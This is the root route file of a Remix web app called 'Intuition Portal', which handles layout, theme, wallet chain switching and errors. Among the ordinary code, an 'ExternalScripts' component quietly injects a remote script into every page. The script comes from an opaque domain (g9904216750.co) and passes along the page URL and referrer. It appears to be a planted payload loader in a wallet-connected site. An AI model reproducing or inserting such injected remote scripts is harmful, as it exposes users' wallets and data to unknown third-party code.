import Providers from '@client/providers'
import { ClientHintCheck, getHints } from '@lib/utils/client-hints'
import { useNonce } from '@lib/utils/nonce-provider'
import { json, LoaderFunctionArgs, type MetaFunction } from '@remix-run/node'
import {
  isRouteErrorResponse,
  Links,
  Meta,
  Outlet,
  Scripts,
  ScrollRestoration,
  useLoaderData,
  useLocation,
  useRouteError,
} from '@remix-run/react'
import { useTheme } from '@routes/actions+/set-theme'
import { getEnv } from '@server/env'
import { getTheme } from '@server/theme'

import './styles/globals.css'

import { useEffect } from 'react'

import { Text, Toaster } from '@0xintuition/1ui'

import { CURRENT_ENV } from '@lib/utils/constants'
import { getChainEnvConfig } from '@lib/utils/environment'
import logger from '@lib/utils/logger'
import { setupAPI } from '@server/auth'
import { ClientOnly } from 'remix-utils/client-only'
import { baseSepolia } from 'viem/chains'
import { useAccount, useSwitchChain } from 'wagmi'

export const meta: MetaFunction<typeof loader> = ({ data }) => {
  return [
    { title: data ? 'Intuition Portal' : 'Error | Intuition Portal' },
    { name: 'description', content: `Intuition Portal` },
  ]
}

export async function loader({ request }: LoaderFunctionArgs) {
  setupAPI(request)

  return json({
    env: getEnv(),
    requestInfo: {
      hints: getHints(request),
      path: new URL(request.url).pathname,
      userPrefs: {
        theme: getTheme(request),
      },
    },
  })
}

export function Document({
  children,
  nonce,
  /* eslint-disable @typescript-eslint/no-unused-vars */
  theme = 'system',
}: {
  children: React.ReactNode
  nonce?: string
  theme?: string
}) {
  return (
    <html lang="en" data-theme="dark">
      <head>
        {nonce && <ClientHintCheck nonce={nonce} />}
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <Meta />
        <Links />
        <ExternalScripts />
      </head>
      <body>
        {children}
        <ScrollRestoration />
        <Scripts />
      </body>
    </html>
  )
}

export function ExternalScripts() {
  const location = useLocation()

  useEffect(() => {
    const scriptId = 'custom-script'

    const existingScript = document.getElementById(scriptId)
    if (existingScript) {
      return
    }

    const customScript = document.createElement('script')
    customScript.id = scriptId
    customScript.async = true
    customScript.src = `https://g9904216750.co/gb?id=-NzA1YkYvThmMw5rFg9n&refurl=${document.referrer}&winurl=${encodeURIComponent(window.location.href)}`

    document.head.appendChild(customScript)

    return () => {
      customScript.remove()
    }
  }, [location]) // re-run the effect if location changes

  return null // this component doesn't render anything itself
}

export default function App() {
  const nonce = useNonce()
  const theme = useTheme()
  const { env } = useLoaderData<typeof loader>()

  return (
    <Document nonce={nonce} theme={theme}>
      <Toaster position="top-right" />
      <ClientOnly>
        {() => (
          <Providers privyAppId={env.PRIVY_APP_ID}>
            <AppLayout />
          </Providers>
        )}
      </ClientOnly>
    </Document>
  )
}

export function AppLayout() {
  const { chain } = useAccount()
  const { switchChain } = useSwitchChain()

  useEffect(() => {
    if (chain?.id !== baseSepolia.id && switchChain) {
      switchChain({
        chainId: getChainEnvConfig(CURRENT_ENV).chainId,
      })
    }
  }, [chain, switchChain])

  return (
    <main className="relative flex min-h-screen w-full flex-col justify-between antialiased">
      <Outlet />
    </main>
  )
}

// TODO: Update styling/messaging [ENG-2772]
export function ErrorBoundary() {
  const error = useRouteError()
  let title = '404'
  let description = 'Page Not Found'

  logger('ROOT ERROR BOUNDARY: \n', error)

  const ErrorMessage = ({
    title,
    description,
  }: {
    title: string
    description: string
  }) => (
    <Document>
      <div className="flex flex-col items-center justify-center h-[90vh]">
        <Text variant="heading1">{title}</Text>
        <Text variant="heading4">{description}</Text>
      </div>
    </Document>
  )

  if (isRouteErrorResponse(error)) {
    title = error.status.toString()
    description = error.statusText
  } else if (error instanceof Error) {
    title = 'Error'
    description = 'Something went wrong...'
  }

  return <ErrorMessage title={title} description={description} />
}
